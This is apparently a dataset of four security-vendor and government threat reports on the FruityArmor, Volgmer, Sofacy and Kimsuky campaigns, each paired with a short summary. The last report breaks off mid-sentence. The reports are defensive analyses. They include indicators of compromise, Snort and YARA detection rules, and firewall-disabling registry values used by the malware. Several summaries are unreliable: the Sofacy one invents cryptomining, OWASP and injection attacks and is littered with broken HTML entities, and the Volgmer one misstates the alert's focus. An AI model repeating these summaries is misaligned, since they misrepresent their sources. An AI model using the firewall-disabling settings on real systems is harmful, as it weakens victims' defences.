URL;TITLE;RAW;SUMMARY;LANG;DATE
https://securelist.com/windows-zero-day-exploit-used-in-targeted-attacks-by-fruityarmor-apt/76396/;Windows zero-day exploit used in targeted attacks by FruityArmor APT;A few days ago, Microsoft published the “critical” MS16-120 security bulletin with fixes for vulnerabilities in Microsoft Windows, Microsoft Office, Skype for Business, Silverlight and Microsoft Lync.One of the vulnerabilities – CVE-2016-3393 – was reported to Microsoft by Kaspersky Lab in September 2016.Here’s a bit of background on how this zero-day was discovered. A few of months ago, we deployed a new set of technologies in our products to identify and block zero-day attacks. These technologies proved their effectiveness earlier this year, when we discovered two Adobe Flash zero-day exploits – CVE-2016-1010 and CVE-2016-4171. Two Windows EoP exploits have also been found with the help of this technology. One is CVE-2016-0165. The other is CVE-2016-3393.Like most zero-day exploits found in the wild today, CVE-2016-3393 is used by an APT group we call FruityArmor. FruityArmor is perhaps a bit unusual due to the fact that it leverages an attack platform that is built entirely around PowerShell. The group’s primary malware implant is written in PowerShell and all commands from the operators are also sent in the form of PowerShell scripts.In this report we describe the vulnerability that was used by this group to elevate privileges on a victim’s machine. Please keep in mind that we will not be publishing all the details about this vulnerability because of the risk that other threat actors may use them in their attacks.Attack chain descriptionTo achieve remote code execution on a victim’s machine, FruityArmor normally relies on a browser exploit. Since many modern browsers are built around sandboxes, a single exploit is generally not sufficient to allow full access to a targeted machine. Most of the recent attacks we’ve seen that rely on a browser exploit are combined with an EoP exploit, which allows for a reliable sandbox escape.In the case of FruityArmor, the initial browser exploitation is always followed by an EoP exploit. This comes in the form of a module, which runs directly in memory. The main goal of this module is to unpack a specially crafted TTF font containing the CVE-2016-3393 exploit. After unpacking, the module directly loads the code exploit from memory with the help of AddFontMemResourceEx. After successfully leveraging CVE-2016-3393, a second stage payload is executed with higher privileges to execute PowerShell with a meterpreter-style script that connects to the C&C.EOP zero-day detailsThe vulnerability is located in the cjComputeGLYPHSET_MSFT_GENERAL function from the Win32k.sys system module. This function parses the cmap table and fills internal structures. The CMAP structure looks like this:The most interesting parts of this structure are two arrays – endCount and startCount. The exploit contains the next cmap table with segments:To compute how much memory to allocate to internal structures, the function executes this code:After computing this number, the function allocates memory for structures in the following way:The problem is that if we compute the entire table, we will achieve an integer overflow and the cnt variable will contain an incorrect value.In kernel, we see the following picture:The code allocates memory only for 0x18 InternalStruct but then there is a loop for all the segments range (this value was extracted from the file directly):Using the cmap table, the v44 variable (index) could be controlled and, as a result, we get memory corruption. To achieve it, the attacker can do the following:Make an integer overflow in win32k!cjComputeGLYPHSET_MSFT_GENERAL Make a specific segment ranges in font file to access interesting memory.What about Windows 10? As most of you know, the font processing in Windows 10 is performed in a special user mode process with restricted privileges. This is a very good solution but the code has the same bug in the TTF processing.As a result, if you load/open this font exploit in Windows 10, you will see the crash of fontdrvhost.exe:Kaspersky Lab detects this exploit as:HEUR:Exploit.Win32.GenericPDM:Exploit.Win32.GenericWe would like to thank Microsoft for their swift response in closing this security hole.* More information about the FruityArmor APT group is available to customers of Kaspersky Intelligence Services. Contact: intelreports@kaspersky.com;A zero-day vulnerability has been discovered by Kaspersky Lab in multiple Microsoft products, including the Win32k!cjComputeGLYPHSET_MSFT_GENERAL system. The malicious code is hidden within a specially crafted TTF file to exploit integer overflow and cause fontdrvhost.exe (Windows 10) to crash.;en;
https://www.cisa.gov/news-events/alerts/2017/11/14/hidden-cobra-north-korean-trojan-volgmer;HIDDEN COBRA – North Korean Trojan: Volgmer;"Systems AffectedNetwork systemsOverviewThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a Trojan malware variant used by the North Korean government—commonly known as Volgmer. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.gov/hiddencobra.FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to North Korean government malicious cyber activity.This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with Volgmer malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the Volgmer malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.For a downloadable copy of IOCs, see:NCCIC conducted analysis on five files associated with or identified as Volgmer malware and produced a Malware Analysis Report (MAR). MAR-10135536-D examines the tactics, techniques, and procedures observed. For a downloadable copy of the MAR, see:MAR (.pdf)MAR IOCs (.stix)Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. Since at least 2013, HIDDEN COBRA actors have been observed using Volgmer malware in the wild to target the government, financial, automotive, and media industries.It is suspected that spear phishing is the primary delivery mechanism for Volgmer infections; however, HIDDEN COBRA actors use a suite of custom tools, some of which could also be used to initially compromise a system. Therefore, it is possible that additional HIDDEN COBRA malware may be present on network infrastructure compromised with VolgmerThe U.S. Government has analyzed Volgmer’s infrastructure and have identified it on systems using both dynamic and static IP addresses. At least 94 static IP addresses were identified, as well as dynamic IP addresses registered across various countries. The greatest concentrations of dynamic IPs addresses are identified below by approximate percentage:India (772 IPs) 25.4 percentIran (373 IPs) 12.3 percentPakistan (343 IPs) 11.3 percentSaudi Arabia (182 IPs) 6 percentTaiwan (169 IPs) 5.6 percentThailand (140 IPs) 4.6 percentSri Lanka (121 IPs) 4 percentChina (82 IPs, including Hong Kong (12)) 2.7 percentVietnam (80 IPs) 2.6 percentIndonesia (68 IPs) 2.2 percentRussia (68 IPs) 2.2 percentTechnical DetailsAs a backdoor Trojan, Volgmer has several capabilities including: gathering system information, updating service registry keys, downloading and uploading files, executing commands, terminating processes, and listing directories. In one of the samples received for analysis, the US-CERT Code Analysis Team observed botnet controller functionality.Volgmer payloads have been observed in 32-bit form as either executables or dynamic-link library (.dll) files. The malware uses a custom binary protocol to beacon back to the command and control (C2) server, often via TCP port 8080 or 8088, with some payloads implementing Secure Socket Layer (SSL) encryption to obfuscate communications.Malicious actors commonly maintain persistence on a victim’s system by installing the malware-as-a-service. Volgmer queries the system and randomly selects a service in which to install a copy of itself. The malware then overwrites the ServiceDLL entry in the selected service's registry entry. In some cases, HIDDEN COBRA actors give the created service a pseudo-random name that may be composed of various hardcoded words.Detection and ResponseThis alert’s IOC files provide HIDDEN COBRA indicators related to Volgmer. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.Network Signatures and Host-Based RulesThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.Network Signaturesalert tcp any any -> any any (msg:""Malformed_UA""; content:""User-Agent: Mozillar/""; depth:500; sid:99999999;)___________________________________________________________________________________________________YARA Rulesrule volgmer{meta: description = ""Malformed User Agent""strings: $s = ""Mozillar/""condition: (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s}ImpactA successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts includetemporary or permanent loss of sensitive or proprietary information,disruption to regular operations,financial losses incurred to restore systems and files, andpotential harm to an organization’s reputation.SolutionMitigation StrategiesDHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see Recognizing and Avoiding Email Scams. Follow safe practices when browsing the web. See Good Security Habits and Safeguarding Your Data for additional details.Do not follow unsolicited web links in emails. See Avoiding Social Engineering and Phishing Attacks for more information.Response to Unauthorized Network AccessContact DHS or your local FBI office immediately. To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).RevisionsNovember 14, 2017: Initial version";The summary includes the key takeaways and recommendations from the report related to the North korean government targeting critical infrastructure with the Volgmer malware. It is important to review the full report for more detailed information and analysis.;en;
https://securelist.com/a-slice-of-2017-sofacy-activity/83930/;A Slice of 2017 Sofacy Activity;Sofacy, also known as APT28, Fancy Bear, and Tsar Team, is a highly active and prolific APT. From their high volume 0day deployment to their innovative and broad malware set, Sofacy is one of the top groups that we monitor, report, and protect against. 2017 was not any different in this regard. Our private reports subscription customers receive a steady stream of YARA, IOC, and reports on Sofacy, our most reported APT for the year.This high level of cyber-espionage activity goes back years. In 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as their first stage malware, which at the time had similarities with the old Miniduke implants. This made us believe the two groups were connected, although it looks they split ways at a certain point, with the original Miniduke group switching to the CosmicDuke implant in 2014. The division in malware was consistent and definitive at that point.In 2013, the Sofacy group expanded their arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across 4-5 generations) and a few others. We’ve seen quite a few versions of these implants, which were relatively widespread at some point or still are. In 2015 we noticed another wave of attacks which took advantage of a new release of the AZZY implant, largely undetected by antivirus products. The new wave of attacks included a new generation of USB stealers deployed by Sofacy, with initial versions dating to February 2015. It appeared to be geared exclusively towards high profile targets.Sofacy’s reported presence in the DNC network alongside APT29 brought possibly the highest level of public attention to the group’s activities in 2016, especially when data from the compromise was leaked and “weaponized”. And later 2016, their focus turned towards the Olympics’ and the World Anti-Doping Agency (WADA) and Court of Arbitration for Sports (CAS), when individuals and servers in these organizations were phished and compromised. In a similar vein with past CyberBerkut activity, attackers hid behind anonymous activist groups like “anonpoland”, and data from victimized organizations were similarly leaked and “weaponized”.This write-up will survey notables in the past year of 2017 Sofacy activity, including their targeting, technology, and notes on their infrastructure. No one research group has 100% global visibility, and our collected data is presented accordingly. Here, external APT28 reports on 2017 Darkhotel-style activity in Europe and Dealer’s Choice spearphishing are of interest. From where we sit, 2017 Sofacy activity starts with a heavy focus on NATO and Ukrainian partners, coinciding with lighter interest in Central Asian targets, and finishing the second half of the year with a heavy focus on Central Asian targets and some shift further East.Dealer’s ChoiceThe beginning of 2017 began with a slow cleanup following the Dealer’s Choice campaign, with technical characteristics documented by our colleagues at Palo Alto in several stages at the end of 2016. The group spearphished targets in several waves with Flash exploits leading to their carberp based JHUHUGIT downloaders and further stages of malware. It seems that many folks did not log in and pull down their emails until Jan 2017 to retrieve the Dealer’s Choice spearphish. Throughout these waves, we observed that the targets provided connection, even tangential, to Ukraine and NATO military and diplomatic interests.In multiple cases, Sofacy spoofs the identity of a target, and emails a spearphish to other targets of interest. Often these are military or military-technology and manufacturing related, and here, the DealersChoice spearphish is again NATO related:The global reach that coincided with this focus on NATO and the Ukraine couldn’t be overstated. Our KSN data showed spearphishing targets geolocated across the globe into 2017.AM, AZ, FR, DE, IQ, IT, KG, MA, CH, UA, US, VNDealersChoice emails, like the one above, that we were able to recover from third party sources provided additional targeting insight, and confirmed some of the targeting within our KSN data:TR, PL, BA, AZ, KR, LV, GE, LV, AU, SE, BE0day Deployment(s)Sofacy kicked off the year deploying two 0day in a spearphish document, both a Microsoft Office encapsulated postscript type confusion exploit (abusing CVE-2017-0262) and an escalation of privilege use-after-free exploit (abusing CVE-2017-0263). The group attempted to deploy this spearphish attachment to push a small 30kb backdoor known as GAMEFISH to targets in Europe at the beginning of 2017. They took advantage of the Syrian military conflict for thematic content and file naming “Trump’s_Attack_on_Syria_English.docx”. Again, this deployment was likely a part of their focus on NATO targets.Light SPLM deployment in Central Asia and Consistent InfrastructureMeanwhile in early-to-mid 2017, SPLM/CHOPSTICK/XAgent detections in Central Asia provided a glimpse into ongoing focus on ex-Soviet republics in Central Asia. These particular detections are interesting because they indicate an attempted selective 2nd stage deployment of a backdoor maintaining filestealer, keylogger, and remoteshell functionality to a system of interest. As the latest revision of the backdoor, portions of SPLM didn’t match previous reports on SPLM/XAgent while other similarities were maintained. SPLM 64-bit modules already appeared to be at version 4 of the software by May of the year. Targeting profiles included defense related commercial and military organizations, and telecommunications.Targeting included TR, KZ, AM, KG, JO, UK, UZHeavy Zebrocy deploymentsSince mid-November 2015, the threat actor referred to as “Sofacy” or “APT28” has been utilizing a unique payload and delivery mechanism written in Delphi and AutoIT. We collectively refer to this package and related activity as “Zebrocy” and had written a few reports on its usage and development by June 2017 – Sofacy developers modified and redeployed incremented versions of the malware. The Zebrocy chain follows a pattern: spearphish attachment -> compiled Autoit script (downloader) -> Zebrocy payload. In some deployments, we observed Sofacy actively developing and deploying a new package to a much smaller, specific subset of targets within the broader set.Targeting profiles, spearphish filenames, and lures carry thematic content related to visa applications and scanned images, border control administration, and various administrative notes. Targeting appears to be widely spread across the Middle East, Europe, and Asia:Business accounting practices and standardsScience and engineering centersIndustrial and hydrochemical engineering and standards/certificationMinistry of foreign affairsEmbassies and consulatesNational security and intelligence agenciesPress servicesTranslation servicesNGO – family and social serviceMinistry of energy and industryWe identified new MSIL components deployed by Zebrocy. While recent Zebrocy versioning was 7.1, some of the related Zebrocy modules that drop file-stealing MSIL modules we call Covfacy were v7.0. The components were an unexpected inclusion in this particular toolset. For example, one sent out to a handful of countries identifies network drives when they are added to target systems, and then RC4-like-encrypts and writes certain file metadata and contents to a local path for later exfiltration. The stealer searches for files 60mb and less with these extensions:.doc.docx.xls.xlsx.ppt.pptx.exe.zip.rarAt execution, it installs an application-defined Windows hook. The hook gets windows messages indicating when a network drive has been attached. Upon adding a network drive, the hook calls its “RecordToFile” file stealer method.Zebrocy spearphishing targets:AF, AM, AU, AZ, BD, BE, CN, DE, ES, FI, GE, IL, IN, JO, KW, KG, KZ, LB, LT, MN, MY, NL, OM, PK, PO, SA, ZA, SK, SE, CH, TJ, TM, TR, UA, UAE, UK, US, UZSPLM deployment in Central AsiaSPLM/CHOPSTICK components deployed throughout 2017 were native 64-bit modular C++ Windows COM backdoors supporting http over fully encrypted TLSv1 and TLSv1.2 communications, mostly deployed in the second half of 2017 by Sofacy. Earlier SPLM activity deployed 32-bit modules over unencrypted http (and sometimes smtp) sessions. In 2016 we saw fully functional, very large SPLM/X-Agent modules supporting OS X.The executable module continues to be part of a framework supporting various internal and external components communicating over internal and external channels, maintaining slightly morphed encryption and functionality per deployment. Sofacy selectively used SPLM/CHOPSTICK modules as second stage implants to high interest targets for years now. In a change from previous compilations, the module was structured and used to inject remote shell, keylogger, and filesystem add-ons into processes running on victim systems and maintaining functionality that was originally present within the main module.The newer SPLM modules are deployed mostly to Central Asian based targets that may have a tie to NATO in some form. These targets include foreign affairs government organizations both localized and abroad, and defense organizations’ presence localized, located in Europe and also located in Afghanistan. One outlier SPLM target profile within our visibility includes an audit and consulting firm in Bosnia and Herzegovina.Minor changes and updates to the code were released with these deployments, including a new mutex format and the exclusive use of encrypted HTTP communications over TLS. The compiled code itself already is altered per deployment in multiple subtle ways, in order to stymie identification and automated analysis and accommodate targeted environments. Strings (c2 domains and functionality, error messages, etc) are custom encrypted per deployment.Targets: TR, KZ, BA, TM, AF, DE, LT, NLSPLM/CHOPSTICK/XAgent Modularity and InfrastructureThis subset of SPLM/CHOPSTICK activity leads into several small surprises that take us into 2018, to be discussed in further detail at SAS 2018. The group demonstrates malleability and innovation in maintaining and producing familiar SPLM functionality, but the pragmatic and systematic approach towards producing undetected or difficult-to-detect malware continues. Changes in the second stage SPLM backdoor are refined, making the code reliably modular.Infrastructure NotesSofacy set up and maintained multiple servers and c2 for varying durations, registering fairly recognizable domains with privacy services, registrars that accept bitcoin, fake phone numbers, phony individual names, and 1 to 1 email address to domain registration relationships. Some of this activity and patterns were publicly disclosed, so we expect to see more change in their process in 2018. Also, throughout the year and in previous years, researchers began to comment publicly on Sofacy’s fairly consistent infrastructure setup.As always, attackers make mistakes and give away hints about what providers and registrars they prefer. It’s interesting to note that this version of SPLM implements communications that are fully encrypted over HTTPS. As an example, we might see extraneous data in their SSL/TLS certificates that give away information about their provider or resources. Leading up to summer 2017, infrastructure mostly was created with PDR and Internet Domain Service BS Corp, and their resellers. Hosting mostly was provided at Fast Serv Inc and resellers, in all likelihood related to bitcoin payment processing.Accordingly, the server side certificates appear to be generated locally on VPS hosts that exclusively are paid for at providers with bitcoin merchant processing. One certificate was generated locally on what appeared to be a HP-UX box, and another was generated on “8569985.securefastserver[.]com” with an email address “root@8569985.securefastserver[.]com”, as seen here for their nethostnet[.]com domain. This certificate configuration is ignored by the malware.In addition to other ip data, this data point suggested that Qhoster at https://www.qhoster[.]com was a VPS hosting reseller of choice at the time. It should be noted that the reseller accepted Alfa Click, PayPal, Payza, Neteller, Skrill, WebMoney, Perfect Money, Bitcoin, Litecoin, SolidTrust Pay, CashU, Ukash, OKPAY, EgoPay, paysafecard, Alipay, MG, Western Union, SOFORT Banking, QIWI, Bank transfer for payment.ConclusionSofacy, one of the most active APT we monitor, continues to spearphish their way into targets, reportedly widely phishes for credentials, and infrequently participates in server side activity (including host compromise with BeEF deployment, for example). KSN visibility and detections suggests a shift from their early 2017 high volume NATO spearphish targeting towards the middle east and Central Asia, and finally moving their focus further east into late 2017. Their operational security is good. Their campaigns appear to have broken out into subsets of activity and malware involving GAMEFISH, Zebrocy, and SPLM, to name a few. Their evolving and modified SPLM/CHOPSTICK/XAgent code is a long-standing part of Sofacy activity, however much of it is changing. We’ll cover more recent 2018 change in their targeting and the malware itself at SAS 2018.With a group like Sofacy, once their attention is detected on a network, it is important to review logins and unusual administrator access on systems, thoroughly scan and sandbox incoming attachments, and maintain two factor authentication for services like email and vpn access. In order to identify their presence, not only can you gain valuable insight into their targeting from intelligence reports and gain powerful means of detections with hunting tools like YARA, but out-of-band processing with a solution like KATA is important.Technical AppendixRelated md58f9f697aa6697acee70336f66f2958371a4b9a6b321da199aa6d10180e889313842454b48f5f800029946b1555fba7fcd4a5d44184333442f5015699c2b8af281421419d1be31f1f9ea60e8ed87277dbb1d1a2c64474d2f6e7a5db71ccbafa31953c7321c4959655fdd53302550ce02d57601d717fcf358220340675f8d63c8a02b79c468c38c4312429a499fa4f6c8185cd38f9e2c9397a18013a8921841a04f8e92d8b5488ea76c40601c8f1a0879066b4fb539806ce27be184b6735584339e8e1fcf757fe06be13bead43eaa1338c953c7321c4959655fdd53302550ce02daa2aac4606405d61c7e53140d35d767185cd38f9e2c9397a18013a8921841a0457601d717fcf358220340675f8d63c8a16e1ca26bc66e30bfa52f8a08846613df8e92d8b5488ea76c40601c8f1a08790b137c809e3bf11f2f5d867a6f4215f95237e6dcbc6af50ef5f5211818522c46388009adca35560810ec220544e4fb6aa2163a33330ae5786d3e984db09b2d9d202b79c468c38c4312429a499fa4f6c81842454b48f5f800029946b1555fba7fcd4a5d44184333442f5015699c2b8af28b88633376fbb144971dcb503f72fd1928f9f697aa6697acee70336f66f295837b6f77273cbde76896a36e32b0c0540e11a4b9a6b321da199aa6d10180e8893131421419d1be31f1f9ea60e8ed87277db1a4b9a6b321da199aa6d10180e8893139b10685b774a783eabfecdb6119a8aa3aa34fb2e5849bff4144a1c98a8158970aced5525ba0d4f44ffd01c4db2730a34b1d1a2c64474d2f6e7a5db71ccbafa31b924ff83d9120d934bb49a7a2e3c4292cdb58c2999eeda58a9d0c70f910d1195d4a5d44184333442f5015699c2b8af28d6f2bf2066e053e58fe8bcd39cb2e9ad34dc9a69f33ba93e631cd5048d9f26241c6f8eba504f2f429abf362626545c79139c9ac0776804714ebe8b8d35a04641e228cd74103dc069663bb87d4f22d7d5bed5bc0a8aae2662ea5d2484f80c17608c3f5f1fff999bc783062dd50357be795882a8dd4446abd137c05d2451b85fea296c956fe429cedd1b64b78e6679712282f06d7157dd28a75f1fbb47728aea259a975e0ddd32c0deef1318c485358b20529424eae07677834a770aaa431e6c544cafde8fa7d9e67194d4edd4f2adb92bf6b2ef4daf1b78802548d3e6d4de7ba7ede5d82bb6775a9b1659dccb699fadcb116d2fc1665ce7524826a624be0ded1c20ff290b8393f006eaf4358f09f13e994b02dfdfd44df3c88b0ca8c2327843a4c789ec7537e300411d523aef74407a5e0b32e65caf653d77cab2a866ee2d9dbc27faa10d1bec1a25f66e88645c695016647edddf61954822ddb7ab3341f9a6c52f04b8eb993ca4a3d98607824a10acfb9fe3a0fb3304d749aeed2c3e2e5787eb62deab0e5d61d6bf9e0ba83d9e1d7e2b86b607fe63c76b3d808f84969cb1a781f62182cf0ab94b3c97b0261547dfc6cf504182aaa5575bb38bf584839beb6d51d79a21970cad03e22440ea66bd85931fRelated domainsnethostnet[.]comhostsvcnet[.]cometcrem[.]netmovieultimate[.]comnewfilmts[.]comfastdataexchange[.]orgliveweatherview[.]comanalyticsbar[.]organalyticstest[.]netlifeofmentalservice[.]commeteost[.]comrighttopregnantpower[.]comkiteim[.]orgadobe-flash-updates[.]orggeneralsecurityscan[.]comglobalresearching[.]orglvueton[.]comaudiwheel[.]comonline-reggi[.]comfsportal[.]netnetcorpscanprotect[.]commvband[.]netmvtband[.]netviters[.]orgtreepastwillingmoment[.]comsendmevideo[.]orgsatellitedeluxpanorama[.]comppcodecs[.]comencoder-info[.]tkwmdmediacodecs[.]compostlkwarn[.]comshcserv[.]comversiontask[.]comwebcdelivery[.]commiropc[.]orgsecurityprotectingcorp[.]comuniquecorpind[.]comappexsrv[.]netadobeupgradeflash[.]com;"Sofacy is a well-established actor targeting NATO &amp;amp;amp; Ukrainian military entities, utilizing a diverse assortment of obfuscation tactics targeting both financial &amp;amp; military sectors. Carberp obfuscation was used in 2017 and is still active, as well as a wide range of attacks against financial &amp;amp; military sectors. DealersChoice targeted financial &amp;amp;amp; border sectors, while Zebrocy was used for obfuscation, encoding, &amp;amp;amp; cryptomining. Multiple variants of SPLMs/CHOPSTICKs are being used for modular targeting. Attackers are using a range of attack tactics including nethostnet, HP-UX domains, CGI/R-based injection attacks, &amp;amp; injection attacks with a focus on Windows, MacOS, &amp;amp;amp; Linux. Industries are vulnerable to malware attacks with YARA &amp;amp;amp; OWASP being recommended to identify &amp;amp;amp; counter them. Access to API results requires authentication.";en;
https://securelist.com/the-kimsuky-operation-a-north-korean-apt/57915/;The “Kimsuky” Operation: A North Korean APT?;"For several months, we have been monitoring an ongoing cyber-espionage campaign against South Korean think-tanks. There are multiple reasons why this campaign is extraordinary in its execution and logistics. It all started one day when we encountered a somewhat unsophisticated spy program that communicated with its “master” via a public e-mail server. This approach is rather inherent to many amateur virus-writers and these malware attacks are mostly ignored.However, there were a few things that attracted our attention:The public e-mail server in question was Bulgarian – mail.bg.The compilation path string contained Korean hieroglyphs.These two facts compelled us take a closer look at this malware — Korean compilers alongside Bulgarian e-mail command-and-control communications.The complete path found in the malware presents some Korean strings:D:rsh??UAC_dll(??)Releasetest.pdbThe “rsh” word, by all appearances, means a shortening of “Remote Shell” and the Korean words can be translated in English as “attack” and “completion”, i.e.:D:rshATTACKUAC_dll(COMPLETION)Releasetest.pdbAlthough the full list of victims remains unknown, we managed to identify several targets of this campaign. According to our technical analysis, the attackers were interested in targeting following organizations”.The Sejong InstituteThe Sejong Institute is a non-profit private organization for public interest and a leading think tank in South Korea, conducting research on national security strategy, unification strategy, regional issues, and international political economy.Korea Institute For Defense Analyses (KIDA)KIDA is a comprehensive defense research institution that covers a wide range of defense-related issues. KIDA is organized into seven research centers: the Center for Security and Strategy; the Center for Military Planning; the Center for Human Resource Development; the Center for Resource Management; the Center for Weapon Systems Studies; the Center for Information System Studies; and the Center for Modeling and Simulation. KIDA also has an IT Consulting Group and various supporting departments. KIDA’s mission is to contribute to rational defense policy-making through intensive and systematic research and analysis of defense issues.Ministry of UnificationThe Ministry of Unification is an executive department of the South Korean government responsible for working towards the reunification of Korea. Its major duties are: establishing North Korea Policy, coordinating inter-Korean dialogue, pursuing inter-Korean cooperation and educating the public on unification.Hyundai Merchant MarineHyundai Merchant Marine is a South Korean logistics company providing worldwide container shipping services.Some clues also suggest that computers belonging to “The supporters of Korean Unification” (http://www.unihope.kr/) were also targeted. Among the organizations we counted, 11 are based in South Korea and two entities reside in China.Partly because this campaign is very limited and highly targeted, we have not yet been able to identify how this malware is being distributed. The malicious samples we found are the early stage malware most often delivered by spear-phishing e-mails.Infecting a systemThe initial Trojan dropper is a Dynamic Link Library functioning as a loader for further malware. It does not maintain exports and simply delivers another encrypted library maintained in its resource section. This second library performs all the espionage functionality.When running on Windows 7, the malicious library uses the Metasploit Framework’s open-source code Win7Elevate to inject malicious code into explorer.exe. In any case, be it Windows 7 or not, this malicious code decrypts its spying library from resources, saves it to disk with an apparently random but hardcoded name, for example, ~DFE8B437DD7C417A6D.TMP, in the user’s temporary folder and loads this file as library.This next stage library copies itself into the System32 directory of the Windows folder after the hardcoded file name — either KBDLV2.DLL or AUTO.DLL, depending on the malware sample. Then the service is created for the service dll. Service names also can differ from version to version; we discovered the following names — DriverManage, WebService and WebClientManager. These functions assure malware persistence in a compromised OS between system reboots.At this stage, the malware gathers information about the infected computer. This includes an output of the systeminfo command saved in the file oledvbs.inc by following the hardcoded path: C:Program FilesCommon FilesSystemOle DBoledvbs.inc. There is another function called – the malware creates a string containing computer and user names but this isn’t used anywhere. By all appearances, this is a mistake by the malware author. Later on, we will come to a function where such a string could be pertinent but the malware is not able to find this data in the place where it should be. These steps are taken only if it’s running on an infected system for the first time. At system startup, the malicious library performs spying activities when it confirms that it is loaded by the generic svchost.exe process.Spying modulesThere are a lot of malicious programs involved in this campaign but, strangely, they each implement a single spying function. Besides the basic library (KBDLV2.DLL / AUTO.DLL) that is responsible for common communication with its campaign master, we were able to find modules performing the following functions:Keystroke loggingDirectory listing collectionHWP document theftRemote control download and executionRemote control accessDisabling firewallAt system startup, the basic library disables the system firewall and any AhnLab firewall (a South Korean security product vendor) by zeroing out related values in registry:SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyStandardProfile EnableFirewall = 0 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyPublicProfile EnableFirewall = 0 HKLMSOFTWAREAhnLabV3IS2007InternetSec FWRunMode = 0 HKLMSOFTWAREAhnlabV3IS80is fwmode = 0 1 2 3 4 5 6 7 8 9 10 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyStandardProfile EnableFirewall = 0 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyPublicProfile EnableFirewall = 0 HKLMSOFTWAREAhnLabV3IS2007InternetSec FWRunMode = 0 HKLMSOFTWAREAhnlabV3IS80is fwmode = 0It also turns off the Windows Security Center service to prevent alerting the user about the disabled firewall.It is not accidental that the malware author has singled out AhnLab’s security product. During our Winnti research, we learnt that one of the Korean victims was severely criticized by South Korean regulators for using foreign security products. We do not know for sure how this criticism affected other South Korean organizations, but we do know that many South Korean organizations install AhnLab security products. Accordingly, these attackers don’t even bother evading foreign vendors’ products, because their targets are solely South Korean.Once the malware disables the AhnLab firewall, it checks whether the file taskmgr.exe is located in the hardcoded C:WINDOWS folder. If the file is present, it runs this executable. Next, the malware loops every 30 minutes to report itself and wait for response from its operator.CommunicationsCommunication between bot and operator flows through the Bulgarian web-based free email server (mail.bg). The bot maintains hardcoded credentials for its e-mail account. After authenticating, the malware sends e-mails to another specified e-mail address, and reads e-mails from the inbox. All these activities are performed via the “mail.bg” web-interface with the use of the system Wininet API functions. From all the samples that we managed to obtain, we extracted the following email accounts used in this campaign:beautifl@mail.bg ennemyman@mail.bg fasionman@mail.bg happylove@mail.bg lovest000@mail.bg monneyman@mail.bg sportsman@mail.bg veryhappy@mail.bg 1 2 3 4 5 6 7 8 beautifl @ mail . bg ennemyman @ mail . bg fasionman @ mail . bg happylove @ mail . bg lovest000 @ mail . bg monneyman @ mail . bg sportsman @ mail . bg veryhappy @ mail . bgHere are the two “master” email addresses to which the bots send e-mails on behalf of the above-mentioned accounts. They report on status and transmit infected system information via attachments:iop110112@hotmail.com rsh1213@hotmail.com 1 2 iop110112 @ hotmail . com rsh1213 @ hotmail . comRegular reportingTo report infection status, the malware reads from C:Program FilesCommon FilesSystemOle DBoledvbs.inc which contains the systeminfo command output. If the file exists, it is deleted after reading.Then, it reads user-related info from the file sqlxmlx.inc in the same folder (we can see strings referencing to “UserID” commentary in this part of the code). But this file was never created. As you recall, there is a function that should have collected this data and should have saved it into this sqlxmlx.inc file. However, on the first launch, the collected user information is saved into “xmlrwbin.inc”. This effectively means that the malware writer mistakenly coded the bot to save user information into the wrong file. There is a chance for the mistaken code to still work — user information could be copied into the send information heap. But not in this case – at the time of writing, the gathered user information variable which should point to the xmlrwbin.inc filename has not yet been initialized, causing the file write to fail. We see that sqlxmlx.inc is not created to store user information.Next, the intercepted keystrokes are read from the file and sent to the master. Keystrokes are logged and kept in an ordinary and consistent format in this file – both the names of windows 